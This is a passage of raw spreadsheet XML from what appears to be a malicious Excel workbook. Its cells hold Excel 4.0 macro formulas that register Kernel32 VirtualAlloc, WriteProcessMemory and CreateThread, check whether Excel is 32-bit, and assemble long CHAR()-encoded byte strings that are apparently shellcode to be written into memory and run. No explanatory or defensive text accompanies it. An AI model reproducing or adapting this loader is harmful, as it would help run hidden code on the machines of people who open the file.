        <v>q9K_x000C_6Ì_x0003_3µ¼_x0011_x£Æß·uLš¼_x001D_	.AâlÍóšøjÔìØÖOÿüE”P‰LvG¿)qRAëöaé?·ûÞþm²l_x001B__x0001_-ÝŒÍÖH8ÚE_x000F_:_x000D_ÐGí_x0001_ÿ@¯ö§•*NäNÈ_x0015_]S_x0008__x0004_¥,"áf–Öüy)e¾–Yï_x0005_Ï'@ð²šº=_x0019__x0012_LºÐ¢,5òÉ×_x000B_â×óFZÓ5G²½ú¼_x001B_Twã_x0013_†zq&amp;ZFÊáÛóu÷2_x000C__x0005_¡^n}¼ð¬4òÒŠ­^4E_x0014_—@6ÿ_x001F_îS‡-Þd_x000F_ºÆÛ°§f­©ÖÊ×$_x001C_Á_x0017_¿]_x0010_v_x001D_Ë;ãÎßT_x001B_9Pp–ìe!{_x0005_Œ&gt;Ù:…}‘0¿Q½¶!%ˆ†ýzd</v>
      </c>
      <c r="C4" t="str">
        <f>CHAR(39)&amp;CHAR(72)&amp;CHAR(45)&amp;CHAR(248)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(226)&amp;CHAR(244)&amp;CHAR(163)</f>
        <v>'H-øÿÿÿâô£</v>
      </c>
    </row>
    <row r="5" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A5" t="b">
        <f>GOTO(A5)</f>
        <v>0</v>
      </c>
      <c r="B5" t="str">
        <f>CHAR(230)&amp;CHAR(146)&amp;CHAR(35)&amp;CHAR(250)&amp;CHAR(120)&amp;CHAR(68)&amp;CHAR(203)&amp;CHAR(116)&amp;CHAR(25)&amp;CHAR(156)&amp;CHAR(130)&amp;CHAR(3)&amp;CHAR(144)&amp;CHAR(121)&amp;CHAR(247)&amp;CHAR(247)&amp;CHAR(149)&amp;CHAR(155)&amp;CHAR(17)&amp;CHAR(191)&amp;CHAR(160)&amp;CHAR(218)&amp;CHAR(179)&amp;CHAR(251)&amp;CHAR(101)&amp;CHAR(104)&amp;CHAR(106)&amp;CHAR(91)&amp;CHAR(165)&amp;CHAR(100)&amp;CHAR(65)&amp;CHAR(103)&amp;CHAR(74)&amp;CHAR(251)&amp;CHAR(193)&amp;CHAR(112)&amp;CHAR(31)&amp;CHAR(53)&amp;CHAR(138)&amp;CHAR(129)&amp;CHAR(73)&amp;CHAR(207)&amp;CHAR(133)&amp;CHAR(131)&amp;CHAR(198)&amp;CHAR(10)&amp;CHAR(229)&amp;CHAR(94)&amp;CHAR(18)&amp;CHAR(1)&amp;CHAR(92)&amp;CHAR(70)&amp;CHAR(238)&amp;CHAR(142)&amp;CHAR(209)&amp;CHAR(31)&amp;CHAR(86)&amp;CHAR(207)&amp;CHAR(138)&amp;CHAR(70)&amp;CHAR(74)&amp;CHAR(86)&amp;CHAR(18)&amp;CHAR(115)&amp;CHAR(48)&amp;CHAR(123)&amp;CHAR(102)&amp;CHAR(59)&amp;CHAR(14)&amp;CHAR(241)&amp;CHAR(89)&amp;CHAR(158)&amp;CHAR(126)&amp;CHAR(205)&amp;CHAR(255)&amp;CHAR(254)&amp;CHAR(254)&amp;CHAR(77)&amp;CHAR(85)&amp;CHAR(87)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(254)&amp;CHAR(76)&amp;CHAR(40)&amp;CHAR(93)&amp;CHAR(183)&amp;CHAR(155)&amp;CHAR(161)&amp;CHAR(108)&amp;CHAR(58)&amp;CHAR(151)&amp;CHAR(159)&amp;CHAR(68)&amp;CHAR(26)&amp;CHAR(242)&amp;CHAR(25)&amp;CHAR(250)&amp;CHAR(48)&amp;CHAR(98)&amp;CHAR(93)&amp;CHAR(71)&amp;CHAR(225)&amp;CHAR(251)&amp;CHAR(90)&amp;CHAR(232)&amp;CHAR(116)&amp;CHAR(161)&amp;CHAR(84)&amp;CHAR(244)&amp;CHAR(59)&amp;CHAR(29)&amp;CHAR(81)&amp;CHAR(70)&amp;CHAR(116)&amp;CHAR(248)&amp;CHAR(236)&amp;CHAR(100)&amp;CHAR(39)&amp;CHAR(170)&amp;CHAR(132)&amp;CHAR(165)&amp;CHAR(14)&amp;CHAR(56)&amp;CHAR(224)&amp;CHAR(109)&amp;CHAR(86)&amp;CHAR(18)&amp;CHAR(88)&amp;CHAR(156)&amp;CHAR(242)&amp;CHAR(196)&amp;CHAR(54)&amp;CHAR(35)&amp;CHAR(31)&amp;CHAR(12)&amp;CHAR(41)&amp;CHAR(33)&amp;CHAR(5)&amp;CHAR(215)&amp;CHAR(247)&amp;CHAR(20)&amp;CHAR(176)&amp;CHAR(235)&amp;CHAR(137)&amp;CHAR(219)&amp;CHAR(204)&amp;CHAR(119)&amp;CHAR(194)&amp;CHAR(212)&amp;CHAR(134)&amp;CHAR(197)&amp;CHAR(106)&amp;CHAR(181)&amp;CHAR(238)&amp;CHAR(206)&amp;CHAR(122)&amp;CHAR(89)&amp;CHAR(208)&amp;CHAR(184)&amp;CHAR(91)&amp;CHAR(65)&amp;CHAR(23)&amp;CHAR(22)&amp;CHAR(177)&amp;CHAR(216)&amp;CHAR(185)&amp;CHAR(92)&amp;CHAR(174)&amp;CHAR(6)&amp;CHAR(108)&amp;CHAR(190)&amp;CHAR(175)&amp;CHAR(171)&amp;CHAR(212)&amp;CHAR(197)&amp;CHAR(235)&amp;CHAR(45)&amp;CHAR(150)&amp;CHAR(109)&amp;CHAR(164)&amp;CHAR(241)&amp;CHAR(55)&amp;CHAR(235)&amp;CHAR(202)&amp;CHAR(110)&amp;CHAR(97)&amp;CHAR(188)&amp;CHAR(94)&amp;CHAR(168)&amp;CHAR(108)&amp;CHAR(142)&amp;CHAR(237)&amp;CHAR(84)&amp;CHAR(105)&amp;CHAR(193)&amp;CHAR(252)&amp;CHAR(140)&amp;CHAR(200)&amp;CHAR(211)&amp;CHAR(90)&amp;CHAR(253)&amp;CHAR(226)&amp;CHAR(202)&amp;CHAR(6)&amp;CHAR(206)&amp;CHAR(234)&amp;CHAR(235)&amp;CHAR(236)&amp;CHAR(125)&amp;CHAR(104)&amp;CHAR(109)&amp;CHAR(31)&amp;CHAR(61)&amp;CHAR(82)&amp;CHAR(68)&amp;CHAR(114)&amp;CHAR(197)&amp;CHAR(5)&amp;CHAR(98)&amp;CHAR(45)&amp;CHAR(110)&amp;CHAR(244)&amp;CHAR(201)&amp;CHAR(46)&amp;CHAR(167)&amp;CHAR(208)&amp;CHAR(236)&amp;CHAR(174)&amp;CHAR(193)&amp;CHAR(166)&amp;CHAR(200)&amp;CHAR(151)&amp;CHAR(65)&amp;CHAR(29)&amp;CHAR(135)&amp;CHAR(133)&amp;CHAR(60)&amp;CHAR(117)&amp;CHAR(48)&amp;CHAR(64)&amp;CHAR(6)&amp;CHAR(100)&amp;CHAR(72)&amp;CHAR(55)&amp;CHAR(239)&amp;CHAR(245)&amp;CHAR(15)&amp;CHAR(92)&amp;CHAR(150)&amp;CHAR(198)&amp;CHAR(119)&amp;CHAR(30)&amp;CHAR(110)&amp;CHAR(193)</f>
        <v>æ’#úxDËt_x0019_œ‚_x0003_y÷÷•›_x0011_¿ Ú³ûehj[¥dAgJûÁp_x001F_5ŠIÏ…ƒÆ
å^_x0012__x0001_\FîŽÑ_x001F_VÏŠFJV_x0012_s0{f;_x000E_ñYž~ÍÿþþMUW_x0006__x0002_þL(]·›¡l:—ŸD_x001A_ò_x0019_ú0b]GáûZèt¡Tô;_x001D_QFtøìd'ª„¥_x000E_8àmV_x0012_XœòÄ6#_x001F__x000C_)!_x0005_×÷_x0014_°ë‰ÛÌwÂÔ†ÅjµîÎzYÐ¸[A_x0017__x0016_±Ø¹\®_x0006_l¾¯«ÔÅë-–m¤ñ7ëÊna¼^¨lŽíTiÁüŒÈÓZýâÊ_x0006_Îêëì}hm_x001F_=RDrÅ_x0005_b-nôÉ.§Ðì®Á¦È—A_x001D_‡…&lt;u0@_x0006_dH7ïõ_x000F_\–Æw_x001E_nÁ</v>
      </c>
      <c r="C5" t="str">
        <f>CHAR(56)&amp;CHAR(7)&amp;CHAR(143)&amp;CHAR(152)&amp;CHAR(188)&amp;CHAR(189)&amp;CHAR(249)&amp;CHAR(206)&amp;CHAR(139)&amp;CHAR(235)</f>
        <v>8_x0007_˜¼½ùÎ‹ë</v>
      </c>
    </row>
    <row r="6" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A6" t="b">
        <f>REGISTER("Kernel32","VirtualAlloc","JJJJJ","Valloc",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B6" t="str">
        <f>CHAR(225)&amp;CHAR(70)&amp;CHAR(182)&amp;CHAR(228)&amp;CHAR(138)&amp;CHAR(91)&amp;CHAR(36)&amp;CHAR(223)&amp;CHAR(214)&amp;CHAR(21)&amp;CHAR(196)&amp;CHAR(129)&amp;CHAR(173)&amp;CHAR(35)&amp;CHAR(237)&amp;CHAR(255)&amp;CHAR(49)&amp;CHAR(58)&amp;CHAR(75)&amp;CHAR(255)&amp;CHAR(23)&amp;CHAR(220)&amp;CHAR(72)&amp;CHAR(145)&amp;CHAR(145)&amp;CHAR(225)&amp;CHAR(192)&amp;CHAR(131)&amp;CHAR(4)&amp;CHAR(33)&amp;CHAR(144)&amp;CHAR(158)&amp;CHAR(127)&amp;CHAR(212)&amp;CHAR(77)&amp;CHAR(63)&amp;CHAR(79)&amp;CHAR(204)&amp;CHAR(36)&amp;CHAR(245)&amp;CHAR(98)&amp;CHAR(159)&amp;CHAR(223)&amp;CHAR(75)&amp;CHAR(155)&amp;CHAR(35)&amp;CHAR(117)&amp;CHAR(235)&amp;CHAR(90)&amp;CHAR(69)&amp;CHAR(90)&amp;CHAR(33)&amp;CHAR(213)&amp;CHAR(220)&amp;CHAR(47)&amp;CHAR(186)&amp;CHAR(220)&amp;CHAR(203)&amp;CHAR(202)&amp;CHAR(7)&amp;CHAR(103)&amp;CHAR(172)&amp;CHAR(230)&amp;CHAR(118)&amp;CHAR(179)&amp;CHAR(119)&amp;CHAR(207)&amp;CHAR(146)&amp;CHAR(182)&amp;CHAR(37)&amp;CHAR(137)&amp;CHAR(232)&amp;CHAR(17)&amp;CHAR(213)&amp;CHAR(96)&amp;CHAR(204)&amp;CHAR(71)&amp;CHAR(126)&amp;CHAR(211)&amp;CHAR(154)&amp;CHAR(115)&amp;CHAR(36)&amp;CHAR(60)&amp;CHAR(151)&amp;CHAR(12)&amp;CHAR(198)&amp;CHAR(63)&amp;CHAR(215)&amp;CHAR(22)&amp;CHAR(129)&amp;CHAR(70)&amp;CHAR(51)&amp;CHAR(212)&amp;CHAR(251)&amp;CHAR(212)&amp;CHAR(248)&amp;CHAR(106)&amp;CHAR(237)&amp;CHAR(116)&amp;CHAR(173)&amp;CHAR(25)&amp;CHAR(249)&amp;CHAR(163)&amp;CHAR(223)&amp;CHAR(182)&amp;CHAR(100)&amp;CHAR(218)&amp;CHAR(207)&amp;CHAR(189)&amp;CHAR(166)&amp;CHAR(61)&amp;CHAR(5)&amp;CHAR(211)&amp;CHAR(168)&amp;CHAR(143)&amp;CHAR(77)&amp;CHAR(216)&amp;CHAR(185)&amp;CHAR(40)&amp;CHAR(48)&amp;CHAR(174)&amp;CHAR(162)&amp;CHAR(50)&amp;CHAR(32)&amp;CHAR(165)&amp;CHAR(244)&amp;CHAR(143)&amp;CHAR(47)&amp;CHAR(87)&amp;CHAR(201)&amp;CHAR(183)&amp;CHAR(3)&amp;CHAR(41)&amp;CHAR(248)&amp;CHAR(182)&amp;CHAR(112)&amp;CHAR(201)&amp;CHAR(99)&amp;CHAR(157)&amp;CHAR(137)&amp;CHAR(21)&amp;CHAR(86)&amp;CHAR(219)&amp;CHAR(207)&amp;CHAR(216)&amp;CHAR(230)&amp;CHAR(46)&amp;CHAR(156)&amp;CHAR(237)&amp;CHAR(195)&amp;CHAR(37)&amp;CHAR(137)&amp;CHAR(10)&amp;CHAR(28)&amp;CHAR(86)&amp;CHAR(243)&amp;CHAR(33)&amp;CHAR(143)&amp;CHAR(38)&amp;CHAR(83)&amp;CHAR(172)&amp;CHAR(251)&amp;CHAR(149)&amp;CHAR(245)&amp;CHAR(42)&amp;CHAR(235)&amp;CHAR(186)&amp;CHAR(106)&amp;CHAR(137)&amp;CHAR(251)&amp;CHAR(83)&amp;CHAR(203)&amp;CHAR(51)&amp;CHAR(242)&amp;CHAR(167)&amp;CHAR(66)&amp;CHAR(240)&amp;CHAR(128)&amp;CHAR(174)&amp;CHAR(101)&amp;CHAR(142)&amp;CHAR(52)&amp;CHAR(215)&amp;CHAR(176)&amp;CHAR(35)&amp;CHAR(13)&amp;CHAR(147)&amp;CHAR(160)&amp;CHAR(23)&amp;CHAR(188)&amp;CHAR(220)&amp;CHAR(44)&amp;CHAR(196)&amp;CHAR(68)&amp;CHAR(60)&amp;CHAR(73)&amp;CHAR(64)&amp;CHAR(75)&amp;CHAR(9)&amp;CHAR(214)&amp;CHAR(237)&amp;CHAR(187)&amp;CHAR(55)&amp;CHAR(162)&amp;CHAR(187)&amp;CHAR(105)&amp;CHAR(111)&amp;CHAR(40)&amp;CHAR(67)&amp;CHAR(210)&amp;CHAR(39)&amp;CHAR(168)&amp;CHAR(102)&amp;CHAR(215)&amp;CHAR(58)&amp;CHAR(253)&amp;CHAR(104)&amp;CHAR(210)&amp;CHAR(50)&amp;CHAR(255)&amp;CHAR(186)&amp;CHAR(199)&amp;CHAR(48)&amp;CHAR(206)&amp;CHAR(184)&amp;CHAR(157)&amp;CHAR(45)&amp;CHAR(189)&amp;CHAR(20)&amp;CHAR(39)&amp;CHAR(175)&amp;CHAR(23)&amp;CHAR(194)&amp;CHAR(24)&amp;CHAR(24)&amp;CHAR(240)&amp;CHAR(144)&amp;CHAR(232)&amp;CHAR(201)&amp;CHAR(120)&amp;CHAR(185)&amp;CHAR(101)&amp;CHAR(201)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(41)&amp;CHAR(199)&amp;CHAR(210)&amp;CHAR(29)&amp;CHAR(161)&amp;CHAR(114)&amp;CHAR(91)&amp;CHAR(129)&amp;CHAR(46)&amp;CHAR(44)</f>
        <v>áF¶äŠ[$ßÖ_x0015_Ä­#íÿ1:Kÿ_x0017_ÜH‘‘áÀƒ_x0004_!žÔM?OÌ$õbŸßK›#uëZEZ!ÕÜ/ºÜËÊ_x0007_g¬æv³wÏ’¶%‰è_x0011_Õ`ÌG~Óšs$&lt;—_x000C_Æ?×_x0016_F3ÔûÔøjít­_x0019_ù£ß¶dÚÏ½¦=_x0005_Ó¨MØ¹(0®¢2 ¥ô/WÉ·_x0003_)ø¶pÉc‰_x0015_VÛÏØæ.œíÃ%‰
_x001C_Vó!&amp;S¬û•õ*ëºj‰ûSË3ò§Bð€®eŽ4×°#_x000D_“ _x0017_¼Ü,ÄD&lt;I@K	Öí»7¢»io(CÒ'¨f×:ýhÒ2ÿºÇ0Î¸-½_x0014_'¯_x0017_Â_x0018__x0018_ðèÉx¹eÉ	Ž)ÇÒ_x001D_¡r[.,</v>
      </c>
      <c r="C6" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(188)&amp;CHAR(181)&amp;CHAR(11)&amp;CHAR(195)&amp;CHAR(242)&amp;CHAR(98)&amp;CHAR(7)&amp;CHAR(181)</f>
        <v>÷ý¼µ_x000B_Ãòb_x0007_µ</v>
      </c>
    </row>
    <row r="7" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A7" t="b">
        <f>REGISTER("Kernel32","WriteProcessMemory","JJJCJJ","WProcessMemory",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B7" t="str">
        <f>CHAR(133)&amp;CHAR(71)&amp;CHAR(161)&amp;CHAR(43)&amp;CHAR(238)&amp;CHAR(119)&amp;CHAR(160)&amp;CHAR(118)&amp;CHAR(152)&amp;CHAR(25)&amp;CHAR(35)&amp;CHAR(212)&amp;CHAR(210)&amp;CHAR(13)&amp;CHAR(45)&amp;CHAR(111)&amp;CHAR(62)&amp;CHAR(118)&amp;CHAR(180)&amp;CHAR(23)&amp;CHAR(213)&amp;CHAR(182)&amp;CHAR(132)&amp;CHAR(16)&amp;CHAR(55)&amp;CHAR(239)&amp;CHAR(126)&amp;CHAR(127)&amp;CHAR(166)&amp;CHAR(44)&amp;CHAR(227)&amp;CHAR(204)&amp;CHAR(85)&amp;CHAR(171)&amp;CHAR(232)&amp;CHAR(252)&amp;CHAR(188)&amp;CHAR(26)&amp;CHAR(121)&amp;CHAR(200)&amp;CHAR(161)&amp;CHAR(206)&amp;CHAR(105)&amp;CHAR(62)&amp;CHAR(138)&amp;CHAR(165)&amp;CHAR(98)&amp;CHAR(52)&amp;CHAR(90)&amp;CHAR(60)&amp;CHAR(224)&amp;CHAR(107)&amp;CHAR(55)&amp;CHAR(244)&amp;CHAR(183)&amp;CHAR(165)&amp;CHAR(140)&amp;CHAR(239)&amp;CHAR(35)&amp;CHAR(112)&amp;CHAR(228)&amp;CHAR(185)&amp;CHAR(118)&amp;CHAR(14)&amp;CHAR(211)&amp;CHAR(72)&amp;CHAR(138)&amp;CHAR(253)&amp;CHAR(158)&amp;CHAR(216)&amp;CHAR(216)&amp;CHAR(122)&amp;CHAR(206)&amp;CHAR(43)&amp;CHAR(202)&amp;CHAR(115)&amp;CHAR(87)&amp;CHAR(250)&amp;CHAR(176)&amp;CHAR(33)&amp;CHAR(193)&amp;CHAR(21)&amp;CHAR(84)&amp;CHAR(71)&amp;CHAR(78)&amp;CHAR(69)&amp;CHAR(205)&amp;CHAR(248)&amp;CHAR(143)&amp;CHAR(169)&amp;CHAR(137)&amp;CHAR(49)&amp;CHAR(98)&amp;CHAR(160)&amp;CHAR(94)&amp;CHAR(57)&amp;CHAR(211)&amp;CHAR(108)&amp;CHAR(223)&amp;CHAR(129)&amp;CHAR(251)&amp;CHAR(20)&amp;CHAR(81)&amp;CHAR(187)&amp;CHAR(71)&amp;CHAR(238)&amp;CHAR(116)&amp;CHAR(194)&amp;CHAR(164)&amp;CHAR(120)&amp;CHAR(218)&amp;CHAR(241)&amp;CHAR(95)&amp;CHAR(88)&amp;CHAR(185)&amp;CHAR(249)&amp;CHAR(102)&amp;CHAR(66)&amp;CHAR(60)&amp;CHAR(46)&amp;CHAR(7)&amp;CHAR(189)&amp;CHAR(242)&amp;CHAR(253)&amp;CHAR(53)&amp;CHAR(190)&amp;CHAR(105)&amp;CHAR(83)&amp;CHAR(201)&amp;CHAR(112)&amp;CHAR(112)&amp;CHAR(80)&amp;CHAR(17)&amp;CHAR(21)&amp;CHAR(30)&amp;CHAR(65)&amp;CHAR(46)&amp;CHAR(39)&amp;CHAR(224)&amp;CHAR(85)&amp;CHAR(119)&amp;CHAR(251)&amp;CHAR(227)&amp;CHAR(117)&amp;CHAR(187)&amp;CHAR(225)&amp;CHAR(39)&amp;CHAR(80)&amp;CHAR(116)&amp;CHAR(127)&amp;CHAR(81)&amp;CHAR(81)&amp;CHAR(127)&amp;CHAR(107)&amp;CHAR(65)&amp;CHAR(113)&amp;CHAR(109)&amp;CHAR(32)&amp;CHAR(16)&amp;CHAR(194)&amp;CHAR(16)&amp;CHAR(136)&amp;CHAR(27)&amp;CHAR(157)&amp;CHAR(145)&amp;CHAR(150)&amp;CHAR(97)&amp;CHAR(54)&amp;CHAR(252)&amp;CHAR(230)&amp;CHAR(192)&amp;CHAR(20)&amp;CHAR(69)&amp;CHAR(42)&amp;CHAR(17)&amp;CHAR(253)&amp;CHAR(58)&amp;CHAR(254)&amp;CHAR(178)&amp;CHAR(153)&amp;CHAR(115)&amp;CHAR(198)&amp;CHAR(245)&amp;CHAR(120)&amp;CHAR(182)&amp;CHAR(221)&amp;CHAR(71)&amp;CHAR(88)&amp;CHAR(133)&amp;CHAR(119)&amp;CHAR(31)&amp;CHAR(103)&amp;CHAR(183)&amp;CHAR(9)&amp;CHAR(8)&amp;CHAR(186)&amp;CHAR(77)&amp;CHAR(194)&amp;CHAR(217)&amp;CHAR(70)&amp;CHAR(63)&amp;CHAR(17)&amp;CHAR(19)&amp;CHAR(23)&amp;CHAR(228)&amp;CHAR(213)&amp;CHAR(168)&amp;CHAR(179)&amp;CHAR(181)&amp;CHAR(173)&amp;CHAR(156)&amp;CHAR(226)&amp;CHAR(227)&amp;CHAR(23)&amp;CHAR(244)&amp;CHAR(130)&amp;CHAR(119)&amp;CHAR(47)&amp;CHAR(71)&amp;CHAR(225)&amp;CHAR(36)&amp;CHAR(147)&amp;CHAR(221)&amp;CHAR(28)&amp;CHAR(42)&amp;CHAR(154)&amp;CHAR(195)&amp;CHAR(236)&amp;CHAR(157)&amp;CHAR(204)&amp;CHAR(145)&amp;CHAR(109)&amp;CHAR(20)&amp;CHAR(235)&amp;CHAR(39)&amp;CHAR(199)&amp;CHAR(64)&amp;CHAR(146)&amp;CHAR(48)&amp;CHAR(124)&amp;CHAR(208)&amp;CHAR(92)&amp;CHAR(61)&amp;CHAR(131)&amp;CHAR(47)&amp;CHAR(187)&amp;CHAR(245)&amp;CHAR(47)&amp;CHAR(69)&amp;CHAR(118)&amp;CHAR(170)&amp;CHAR(14)&amp;CHAR(127)&amp;CHAR(111)&amp;CHAR(7)</f>
        <v>…G¡+îw v˜_x0019_#ÔÒ_x000D_-o&gt;v´_x0017_Õ¶„_x0010_7ï~¦,ãÌU«èü¼_x001A_yÈ¡Îi&gt;Š¥b4Z&lt;àk7ô·¥Œï#pä¹v_x000E_ÓHŠýžØØzÎ+ÊsWú°!Á_x0015_TGNEÍø©‰1b ^9Ólßû_x0014_Q»GîtÂ¤xÚñ_X¹ùfB&lt;._x0007_½òý5¾iSÉppP_x0011__x0015__x001E_A.'àUwûãu»á'PtQQkAqm _x0010_Â_x0010_ˆ_x001B_‘–a6üæÀ_x0014_E*_x0011_ý:þ²™sÆõx¶ÝGX…w_x001F_g·	_x0008_ºMÂÙF?_x0011__x0013__x0017_äÕ¨³µ­œâã_x0017_ô‚w/Gá$“Ý_x001C_*šÃìÌ‘m_x0014_ë'Ç@’0|Ð\=ƒ/»õ/Evª_x000E_o_x0007_</v>
      </c>
      <c r="C7" t="str">
        <f>CHAR(121)&amp;CHAR(35)&amp;CHAR(198)&amp;CHAR(236)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(191)&amp;CHAR(112)&amp;CHAR(249)&amp;CHAR(220)</f>
        <v>y#Æì»ë¿pùÜ</v>
      </c>
    </row>
    <row r="8" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A8" t="b">
        <f>REGISTER("Kernel32","CreateThread","JJJJJJJ","CThread",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B8" t="str">
        <f>CHAR(212)&amp;CHAR(242)&amp;CHAR(208)&amp;CHAR(137)&amp;CHAR(47)&amp;CHAR(83)&amp;CHAR(164)&amp;CHAR(241)&amp;CHAR(46)&amp;CHAR(2)&amp;CHAR(24)&amp;CHAR(114)&amp;CHAR(18)&amp;CHAR(134)&amp;CHAR(14)&amp;CHAR(182)&amp;CHAR(28)&amp;CHAR(199)&amp;CHAR(199)&amp;CHAR(116)&amp;CHAR(99)&amp;CHAR(174)&amp;CHAR(187)&amp;CHAR(126)&amp;CHAR(77)&amp;CHAR(189)&amp;CHAR(55)&amp;CHAR(25)&amp;CHAR(136)&amp;CHAR(29)&amp;CHAR(133)&amp;CHAR(179)&amp;CHAR(224)&amp;CHAR(129)&amp;CHAR(182)&amp;CHAR(137)&amp;CHAR(194)&amp;CHAR(7)&amp;CHAR(191)&amp;CHAR(140)&amp;CHAR(98)&amp;CHAR(90)&amp;CHAR(220)&amp;CHAR(92)&amp;CHAR(93)&amp;CHAR(24)&amp;CHAR(230)&amp;CHAR(28)&amp;CHAR(62)&amp;CHAR(168)&amp;CHAR(239)&amp;CHAR(103)&amp;CHAR(25)&amp;CHAR(112)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(247)&amp;CHAR(251)&amp;CHAR(19)&amp;CHAR(254)&amp;CHAR(19)&amp;CHAR(44)&amp;CHAR(84)&amp;CHAR(120)&amp;CHAR(106)&amp;CHAR(25)&amp;CHAR(225)&amp;CHAR(117)&amp;CHAR(74)&amp;CHAR(213)&amp;CHAR(55)&amp;CHAR(79)&amp;CHAR(123)&amp;CHAR(96)&amp;CHAR(94)&amp;CHAR(170)&amp;CHAR(122)&amp;CHAR(241)&amp;CHAR(75)&amp;CHAR(55)&amp;CHAR(253)&amp;CHAR(61)&amp;CHAR(96)&amp;CHAR(25)&amp;CHAR(156)&amp;CHAR(246)&amp;CHAR(55)&amp;CHAR(145)&amp;CHAR(73)&amp;CHAR(193)&amp;CHAR(205)&amp;CHAR(25)&amp;CHAR(5)&amp;CHAR(39)&amp;CHAR(128)&amp;CHAR(104)&amp;CHAR(55)&amp;CHAR(98)&amp;CHAR(144)&amp;CHAR(94)&amp;CHAR(181)&amp;CHAR(150)&amp;CHAR(253)&amp;CHAR(113)&amp;CHAR(247)&amp;CHAR(13)&amp;CHAR(83)&amp;CHAR(82)&amp;CHAR(34)&amp;CHAR(239)&amp;CHAR(120)&amp;CHAR(145)&amp;CHAR(178)&amp;CHAR(115)&amp;CHAR(74)&amp;CHAR(118)&amp;CHAR(6)&amp;CHAR(164)&amp;CHAR(22)&amp;CHAR(30)&amp;CHAR(48)&amp;CHAR(130)&amp;CHAR(164)&amp;CHAR(116)&amp;CHAR(86)&amp;CHAR(90)&amp;CHAR(254)&amp;CHAR(92)&amp;CHAR(100)&amp;CHAR(118)&amp;CHAR(223)&amp;CHAR(245)&amp;CHAR(80)&amp;CHAR(132)&amp;CHAR(122)&amp;CHAR(199)&amp;CHAR(206)&amp;CHAR(243)&amp;CHAR(100)&amp;CHAR(30)&amp;CHAR(48)&amp;CHAR(35)&amp;CHAR(103)&amp;CHAR(169)&amp;CHAR(154)&amp;CHAR(32)&amp;CHAR(18)&amp;CHAR(18)&amp;CHAR(160)&amp;CHAR(248)&amp;CHAR(114)&amp;CHAR(19)&amp;CHAR(28)&amp;CHAR(54)&amp;CHAR(220)&amp;CHAR(50)&amp;CHAR(4)&amp;CHAR(74)&amp;CHAR(75)&amp;CHAR(209)&amp;CHAR(110)&amp;CHAR(186)&amp;CHAR(3)&amp;CHAR(95)&amp;CHAR(29)&amp;CHAR(145)&amp;CHAR(80)&amp;CHAR(189)&amp;CHAR(122)&amp;CHAR(14)&amp;CHAR(10)&amp;CHAR(199)&amp;CHAR(197)&amp;CHAR(20)&amp;CHAR(51)&amp;CHAR(125)&amp;CHAR(58)&amp;CHAR(98)&amp;CHAR(65)&amp;CHAR(199)&amp;CHAR(226)&amp;CHAR(120)&amp;CHAR(172)&amp;CHAR(92)&amp;CHAR(159)&amp;CHAR(175)&amp;CHAR(35)&amp;CHAR(243)&amp;CHAR(201)&amp;CHAR(60)&amp;CHAR(83)&amp;CHAR(67)&amp;CHAR(87)&amp;CHAR(90)&amp;CHAR(214)&amp;CHAR(27)&amp;CHAR(114)&amp;CHAR(51)&amp;CHAR(223)&amp;CHAR(9)&amp;CHAR(206)&amp;CHAR(113)&amp;CHAR(39)&amp;CHAR(223)&amp;CHAR(169)&amp;CHAR(219)&amp;CHAR(138)&amp;CHAR(34)&amp;CHAR(137)&amp;CHAR(73)&amp;CHAR(116)&amp;CHAR(95)&amp;CHAR(121)&amp;CHAR(249)&amp;CHAR(150)&amp;CHAR(245)&amp;CHAR(203)&amp;CHAR(13)&amp;CHAR(196)&amp;CHAR(125)&amp;CHAR(216)&amp;CHAR(37)&amp;CHAR(121)&amp;CHAR(69)&amp;CHAR(149)&amp;CHAR(158)&amp;CHAR(50)&amp;CHAR(178)&amp;CHAR(15)&amp;CHAR(83)&amp;CHAR(161)&amp;CHAR(208)&amp;CHAR(193)&amp;CHAR(229)&amp;CHAR(64)&amp;CHAR(150)&amp;CHAR(156)&amp;CHAR(197)&amp;CHAR(175)&amp;CHAR(220)&amp;CHAR(187)&amp;CHAR(158)&amp;CHAR(159)&amp;CHAR(243)&amp;CHAR(198)&amp;CHAR(160)&amp;CHAR(246)&amp;CHAR(189)&amp;CHAR(196)&amp;CHAR(247)&amp;CHAR(92)&amp;CHAR(129)&amp;CHAR(198)</f>
        <v>ÔòÐ‰/S¤ñ._x0002__x0018_r_x0012_†_x000E_¶_x001C_ÇÇtc®»~M½7_x0019_ˆ_x001D_…³à¶‰Â_x0007_¿ŒbZÜ\]_x0018_æ_x001C_&gt;¨ïg_x0019_p4_x0014__x001D_R÷û_x0013_þ_x0013_,Txj_x0019_áuJÕ7O{`^ªzñK7ý=`_x0019_œö7‘IÁÍ_x0019__x0005_'€h7b^µ–ýq÷_x000D_SR"ïx‘²sJv_x0006_¤_x0016__x001E_0‚¤tVZþ\dvßõP„zÇÎód_x001E_0#g©š _x0012__x0012_ ør_x0013__x001C_6Ü2_x0004_JKÑnº_x0003___x001D_‘P½z_x000E_
ÇÅ_x0014_3}:bAÇâx¬\Ÿ¯#óÉ&lt;SCWZÖ_x001B_r3ß	Îq'ß©ÛŠ"‰It_yù–õË_x000D_Ä}Ø%yE•ž2²_x000F_S¡ÐÁå@–œÅ¯Ü»žŸóÆ ö½Ä÷\Æ</v>
      </c>
      <c r="C8" t="str">
        <f>CHAR(203)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(3)&amp;CHAR(15)&amp;CHAR(249)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(133)&amp;CHAR(218)</f>
        <v>Ëë»_x0003__x000F_ùô6…Ú</v>
      </c>
    </row>
    <row r="9" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A9" t="b">
        <f>IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(A9),GOTO(A20))</f>
        <v>0</v>
      </c>
      <c r="B9" t="str">
